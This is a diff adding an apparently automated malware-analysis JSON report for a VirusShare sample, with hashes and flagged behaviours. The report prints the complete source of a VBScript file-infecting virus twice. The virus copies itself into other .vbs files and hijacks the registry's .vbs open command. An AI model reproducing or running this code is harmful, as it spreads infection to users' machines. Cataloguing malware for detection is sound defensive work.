@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "Command": "May run PowerShell commands",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Open": "May open a file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "call": "May call a DLL using Excel 4 Macros",
+            "createtextfile": "May create a text file",
+            "write": "May write to a file"
+        },
+        "macro": "Sub vbsNector()\nDim vi\n\nSet s = WScript.Arguments\nSet objShell = CreateObject(\"WScript.Shell\")\nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nMyscript = WScript.ScriptFullName\nSet f = fs.opentextfile(Myscript,1)\nvir = f.ReadAll\nf.close\nSet f = Nothing\nIf InStr(1,LCase(Myscript),\"readme.txt.vbs\",1) Then\nobjShell.RegWrite \"HKEY_CLASSES_ROOT\\VBSFile\\Shell\\Open\\Command\\\",fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Myscript + \" %1 \" + Chr(34) + fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Chr(34) + \"%1\" + Chr(34) + \" %*\" + Chr(34)\nEnd If\n\nIf s.Count > 1 Then\n\t\tSet f = fs.opentextfile(s(0),1)\n\t\tvi = f.ReadAll\n\t\tf.close\n\t\tSet f = Nothing\n\n\t\tSet f = fs.createtextfile(\"$ttyk$.vb_\")\n\t\n\t\tIf InStr(1,vi,\"vbsNector\",1) Then\n\t\t\tExit Sub\n\t\tEnd If\n\t\n\t\tntt = InStr(1,vir,\"'\",1)\n\t\n\t\tf.write \"call vbsNector\" + vbCrLf\n\t\tf.write vi + vbCrLf\n\t\tf.write Mid(vir,ntt,Len(vir)-ntt)\n\t\t\t\n\t\tf.close\n\t\tSet f = Nothing\n\t\n\t\tobjShell.Run s(1)\n\t\tfs.CopyFile \"$ttyk$.vb_\",s(0)\nEnd If\nEnd Sub"
+    },
+    "filename": "VirusShare_5058ff2b9e177ea349664538979ac71d",
+    "filesize": 1007,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "5058ff2b9e177ea349664538979ac71d",
+        "sha1": "56d0f1df8b67a576c17d31186ca1591546b3eea5",
+        "sha256": "3745d1daa46d220fc3339ec24010eb8cf24d5a48f2de1ab36caac6e5cc0cdbe0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Sub vbsNector()",
+            "Dim vi",
+            "Set s = WScript.Arguments",
+            "Set objShell = CreateObject(\"WScript.Shell\")",
+            "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "Myscript = WScript.ScriptFullName",
+            "Set f = fs.opentextfile(Myscript,1)",
+            "vir = f.ReadAll",
+            "f.close",
+            "Set f = Nothing",
+            "If InStr(1,LCase(Myscript),\"readme.txt.vbs\",1) Then",
+            "objShell.RegWrite \"HKEY_CLASSES_ROOT\\VBSFile\\Shell\\Open\\Command\\\",fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Myscript + \" %1 \" + Chr(34) + fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Chr(34) + \"%1\" + Chr(34) + \" %*\" + Chr(34)",
+            "End If",
+            "If s.Count > 1 Then",
+            "\t\tSet f = fs.opentextfile(s(0),1)",
+            "\t\tvi = f.ReadAll",
+            "\t\tf.close",
+            "\t\tSet f = Nothing",
+            "\t\tSet f = fs.createtextfile(\"$ttyk$.vb_\")",
+            "\t\tIf InStr(1,vi,\"vbsNector\",1) Then",
+            "\t\t\tExit Sub",
+            "\t\tEnd If",
+            "\t\tntt = InStr(1,vir,\"'\",1)",
+            "\t\tf.write \"call vbsNector\" + vbCrLf",
+            "\t\tf.write vi + vbCrLf",
+            "\t\tf.write Mid(vir,ntt,Len(vir)-ntt)",
+            "\t\tf.close",
+            "\t\tSet f = Nothing",
+            "\t\tobjShell.Run s(1)",
+            "\t\tfs.CopyFile \"$ttyk$.vb_\",s(0)",
+            "End If",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.363865",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
